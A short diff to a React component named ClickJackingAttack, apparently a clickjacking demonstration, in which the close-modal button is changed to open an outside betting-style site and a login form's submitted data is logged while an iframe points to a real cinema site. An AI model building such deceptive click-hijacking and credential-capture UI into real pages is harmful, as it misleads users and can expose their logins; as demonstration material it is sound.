@@ -12,8 +12,8 @@ const ClickJackingAttack = () => {
   });
 
   const handleCloseModal = () => {
-    setShowModal(false);
-    setUrlIframe('http://localhost:3000/');
+    // setShowModal(false);
+    window.open('https://365cacuoc.net/', '_blank');
   };
 
   const handleClickBanner = () => {
@@ -36,7 +36,6 @@ const ClickJackingAttack = () => {
     e.preventDefault();
     console.log('Form submitted:', formData);
     setUrlIframe('https://www.cgv.vn/default/movies/now-showing.html');
-    setShowFormLogin(false);
   };
 
   return (
